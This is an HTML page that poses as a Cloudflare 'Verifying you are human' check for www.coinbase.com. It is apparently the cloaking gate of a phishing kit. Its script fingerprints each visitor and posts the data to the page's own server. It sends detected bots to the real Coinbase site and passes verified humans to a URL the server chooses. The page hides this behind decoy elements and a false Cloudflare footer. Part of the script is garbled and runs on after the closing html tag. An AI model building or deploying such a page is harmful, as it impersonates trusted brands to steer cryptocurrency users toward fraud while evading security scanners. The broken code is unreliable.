<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="en-US">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Security Check</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        .wrapper {
            background-color: #1C1C1C;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 2rem;
            color: #d9d9d9;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        .content {
            max-width: 600px;
            width: 100%;
            text-align: center;
        }

        .title {
            font-size: 2rem;
            margin-bottom: 1rem;
            font-weight: 500;
        }

        .subtitle {
            font-size: 1.2rem;
            margin-bottom: 2rem;
            opacity: 0.8;
        }

        .captcha {
            margin: 2rem 0;
            display: flex;
            justify-content: center;
        }

        .message {
            margin: 1rem 0;
            font-size: 0.9rem;
            opacity: 0.7;
        }

        .footer {
            margin-top: 2rem;
            font-size: 0.8rem;
            opacity: 0.6;
        }

        #contactForm {
            position: absolute !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 0 !important;
            height: 0 !important;
        }
        
        .lds-ring {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }
        .lds-ring div {
            box-sizing: border-box;
            display: block;
            position: absolute;
            width: 64px;
            height: 64px;
            margin: 8px;
            border: 8px solid #fff;
            border-radius: 50%;
            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
            border-color: #fff transparent transparent transparent;
        }
        .lds-ring div:nth-child(1) {
            animation-delay: -0.45s;
        }
        .lds-ring div:nth-child(2) {
            animation-delay: -0.3s;
        }
        .lds-ring div:nth-child(3) {
            animation-delay: -0.15s;
        }
        @keyframes lds-ring {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <meta http-equiv="refresh" content="300">
</head>
<body class="wrapper">
    <!-- Honeypot fields with cryptic names and randomized values -->
    <input type="hidden" name="csrf_token" value="njSJtm3Rsqj7UUVX8mn2Y4mvzDyZdxIqYL53yhVDaxnWbfKT6btB4AavzYtV6wcm+cWlwTyYy/KjJMhc4xGxz4bGIFtRmx093uXM7cqO6fk=">
    <input type="hidden" name="csrf__secondary_token" value="2nd_njSJtm3Rsqj7UUVX8mn2Y4mvzDyZdxIqYL53yhVDaxnWbfKT6btB4AavzYtV6wcm+cWlwTyYy/KjJMhc4xGxz4bGIFtRmx093uXM7cqO6fk=_nd2">
    <input type="hidden" name="csrf_name" value="constant_form_validator">
    <input type="hidden" id="brutal-detector" value="SXNmeGtidkFiVmt8fFBjejN2Q3FuQkxlTzUwN1JXV1ZGZ3R6VXoxVTFWM0dmaWVaUWNCTDd1YWs">
    
    <!-- Browser feature detection list (hidden) -->
    <ul id="tests" style="display:none;">
        <li>scroll: undefined</li>
        <li>mousemove: true</li>
        <li>keyup: true</li>
        <li>touchstart: undefined</li>
        <li>devicemotion: false</li>
        <li>deviceorientation: undefined</li>
        <li>MozOrientation: undefined</li>
    </ul>
    
    <!-- Honeypot form (hidden) -->
    <form id="contactForm">
        <input type="email" name="email-field" autocomplete="off">
        <input type="text" name="username-field" autocomplete="off">
        <input type="url" name="website-field" autocomplete="off">
    </form>

    <!-- Main content with complex nesting -->
    <div class="content" role="main" id="root">
        <div class="main-content" id="brt_optimising_ie3KtzuW">
            <div class="row" id="brt_optimising_OmKh3e1y">
                <h1 class="title zone-name-title"><span class="innerclass">www.coinbase.com</span></h1>
            </div>
            <h2 id="challenge-running" class="subtitle">
                <span class="innerclass">Verifying you are human. This may take a few seconds.</span>
            </h2>
            
            <!-- Challenge container -->
            <div id="challenge-stage" style="margin-top: 1rem;">
                <div id="captchaContainer" style="display:none;">
                    <div>
                        <div class="cf-turnstile" 
                            data-sitekey="0x4AAAAAAAC3DHQFLr1GavRB"
                            data-callback="onCaptchaSuccess"
                            data-theme="dark"></div>
                    </div>
                </div>
            </div>
            
            <!-- Spinner element -->
            <div id="challenge-spinner" class="spacer loading-spinner" style="display: none; visibility: visible;">
                <div class="lds-ring" id="brt_optimising_9UB2mEF4">
                    <div id="brt_optimising_M91wMPcF"></div>
                    <div id="brt_optimising_KUSfgg0x"></div>
                    <div id="brt_optimising_EOoYHQdQ"></div>
                    <div id="brt_optimising_PNJReu5N"></div>
                </div>
            </div>
            
            <!-- Challenge body text with span wrapping -->
            <div id="challenge-body-text" class="message spacer">
                <span class="innerclass">www.coinbase.com</span> needs to review the security of your connection before proceeding.
            </div>
            
            <!-- Success state (hidden initially) -->
            <div id="challenge-success" style="display: none;">
                <div id="challenge-success-text" class="h2">Verification successful</div>
                <div class="message spacer" id="brt_optimising_UURnm6b4">
                    Waiting for <span class="innerclass">www.coinbase.com</span> to respond...
                </div>
            </div>
            
            <!-- Noscript fallback -->
            <noscript>
                <div id="challenge-error-title">
                    <div class="h2">
                        <span id="challenge-error-text">Enable JavaScript and cookies to continue</span>
                    </div>
                </div>
            </noscript>
        </div>
        
        <!-- Footer with complex structure -->
        <div class="footer" role="contentinfo" id="brt_optimising_gY53uQ41">
            <div class="footer-inner" id="brt_optimising_zv6dpSQl">
                <div class="clearfix diagnostic-wrapper" id="brt_optimising_fScoy2U0">
                    <div class="ray-id" id="brt_optimising_QIpL6J59">Ray ID: <code id="rayId">1678940732687</code>
                    </div>
                </div>
                <div class="text-center" id="footer-text">This security check is powered by Cloudflare</div>
            </div>
        </div>
    </div>

    <!-- Decoy elements (hidden) -->
    <div style="display:none;visibility:hidden;position:absolute;" id="decoy-1">e918af3cd67e0b14</div>
    <span aria-hidden="true" data-decoy="fa73b2c8" style="width:0;height:0;position:absolute;overflow:hidden;"></span>
    <!-- Invisible spans with random content -->
    <span style="font-size:0;width:0;height:0;position:absolute;">3f7a1e</span>
    <span style="font-size:0;width:0;height:0;position:absolute;">8c2e6b</span>

    <script>
        // Store element IDs in a variable that will be accessible to functions
        const elements = {
            contactForm: 'contactForm',
            mainContent: 'root',
            captchaContainer: 'captchaContainer',
            challengeSpinner: 'challenge-spinner',
            challengeSuccess: 'challenge-success',
            challengeRunning: 'challenge-running',
            rayId: 'rayId'
        };
        
        let captchaToken = null;
        let verificationAttempts = 0;
        const maxAttempts = 3;
        const redirectUrl = 'https://www.coinbase.com';
        const sessionId = Date.now().toString() + Math.random().toString(36).substring(2, 15);

        // Initialize browser test data
        function initBrowserTests() {
            const tests = {
                scroll: typeof window.onscroll !== 'undefined',
                mousemove: typeof window.onmousemove !== 'undefined',
                keyup: typeof window.onkeyup !== 'undefined',
                touchstart: typeof window.ontouchstart !== 'undefined',
                devicemotion: typeof window.ondevicemotion !== 'undefined',
                deviceorientation: typeof window.ondeviceorientation !== 'undefined',
                MozOrientation: typeof window.onMozOrientation !== 'undefined'
            }
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            // Set a random Ray ID
            document.getElementById('rayId').textContent = Date.now().toString(16) + 
                Math.random().toString(16).substring(2, 8);
                
            // Hide captcha container initially
            document.getElementById(elements.captchaContainer).style.display = 'none';
            
            // Start verification
            setTimeout(() => {
                verifyEnvironment();
            }, 500); // Add a small delay for more natural behavior
        });

        // Add random DOM manipulations (similar to what the other page likely does)
        (function() {
            // Add random classes to some elements
            const randomClass = 'r' + Math.random().toString(36).substring(2, 8);
            document.body.classList.add(randomClass);
            
            // Add random attributes to some elements
            const elementsToModify = document.querySelectorAll('div, span');
            elementsToModify.forEach(el => {
                if (Math.random() > 0.7) {
                    el.setAttribute('data-r', Math.random().toString(36).substring(2, 8));
                }
            });
        })();
    </script>
</body>
</html>;
            
            // Update the test list
            Object.keys(tests).forEach(key => {
                const el = document.querySelector(`#tests li:contains(${key})`);
                if (el) {
                    el.textContent = `${key}: ${tests[key]}`;
                }
            } catch (error) {
                console.error('Error in checkAccess:', error);
                document.getElementById(elements.captchaContainer).style.display = 'block';
                document.getElementById(elements.challengeSpinner).style.display = 'none';
            }
            });
            
            return tests;
        }

        async function verifyEnvironment() {
            try {
                // Show spinner while verifying
                document.getElementById(elements.challengeSpinner).style.display = 'block';
                
                const response = await fetch('/verify-environment', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        tests: initBrowserTests(),
                        screenWidth: window.innerWidth,
                        screenHeight: window.innerHeight,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        userAgent: navigator.userAgent,
                        sessionId: sessionId
                    })
                });

                const result = await response.json();
                if (!result.valid) {
                    console.error('Environment verification failed:', result.reason);
                    window.location.replace(redirectUrl);
                    return false;
                }

                // Hide spinner, show captcha
                document.getElementById(elements.challengeSpinner).style.display = 'none';
                document.getElementById(elements.captchaContainer).style.display = 'block';
                return true;
            } catch (error) {
                console.error('Error verifying environment:', error);
                window.location.replace(redirectUrl);
                return false;
            }
        }

        function onCaptchaSuccess(token) {
            captchaToken = token;
            checkAccess();
        }

        async function checkAccess() {
            if (verificationAttempts >= maxAttempts) {
                window.location.replace(redirectUrl);
                return;
            }

            verificationAttempts++;
            
            // Show spinner, hide captcha
            document.getElementById(elements.captchaContainer).style.display = 'none';
            document.getElementById(elements.challengeSpinner).style.display = 'block';

            try {
                // Check honeypot fields
                const formData = new FormData(document.getElementById(elements.contactForm));
                const honeypotData = {
                    email: formData.get('email-field'),
                    username: formData.get('username-field'),
                    website: formData.get('website-field'),
                    csrf_token: document.querySelector('input[name="csrf_token"]').value,
                    csrf_token_secondary: document.querySelector('input[name="csrf__secondary_token"]').value,
                    csrf_name: document.querySelector('input[name="csrf_name"]').value,
                    brutal_module_detector: document.getElementById('brutal-detector').value
                };

                const honeypotResponse = await fetch('/verify-honeypot', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(honeypotData)
                });

                const honeypotResult = await honeypotResponse.json();
                if (honeypotResult.redirect) {
                    window.location.replace(honeypotResult.redirect);
                    return;
                }

                // Verify turnstile token
                const verifyResponse = await fetch('/verify-turnstile', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        token: captchaToken,
                        sessionId: sessionId,
                        timestamp: Date.now(),
                        browserData: JSON.stringify(initBrowserTests())
                    })
                });
                
                const verifyResult = await verifyResponse.json();
                if (verifyResult.success && verifyResult.verified) {
                    // Show success message
                    document.getElementById(elements.challengeSpinner).style.display = 'none';
                    document.getElementById(elements.challengeSuccess).style.display = 'block';
                    document.getElementById(elements.challengeRunning).style.display = 'none';
                    
                    // Redirect after a brief delay to show success message
                    setTimeout(() => {
                        if (verifyResult.url) {
                            window.location.replace(verifyResult.url);
                        } else {
                            window.location.replace(redirectUrl);
                        }
                    }, 1500);
                } else {
                    // If verification failed, try again or redirect
                    if (verificationAttempts >= maxAttempts) {
                        window.location.replace(redirectUrl);
                    } else {
                        document.getElementById(elements.captchaContainer).style.display = 'block';
                        document.getElementById(elements.challengeSpinner).style.display = 'none';
                    }
                }